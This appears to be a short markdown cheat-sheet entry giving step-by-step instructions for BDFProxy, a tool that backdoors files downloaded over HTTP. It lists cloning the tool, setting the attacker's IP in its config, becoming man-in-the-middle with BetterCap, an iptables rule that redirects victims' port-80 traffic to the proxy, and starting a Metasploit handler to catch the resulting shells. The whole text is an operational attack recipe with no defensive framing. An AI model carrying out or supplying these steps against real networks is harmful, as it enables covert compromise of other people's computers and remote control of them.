---
title: BDFProxy (Backdoor on the Fly)
---

These attack only work on a HTTP connection  
BDFProxy Package does not work on new versions of Linux

1. Clone Repo

````bash
git clone https://github.com/secretsquirrel/BDFProxy.git
````

2. Modify `bdfproxy.cfg` File

````bash
proxyMode : transparent
# For Windows and Linux Target they need to be changed separately
HOST : <our-ip-address> 
````

3. Run the `./bdf_proxy.py`
4. Use BetterCap to become MITM
5. Redirect Data to BDFProxy

````bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
````

6. Setup Metasploit Multi Handler

 > [!NOTE]
 > BDFProxy creates an .rc file that consists of all the code required to setup the handler which can be used  
 > `msfconsole -r <filename>`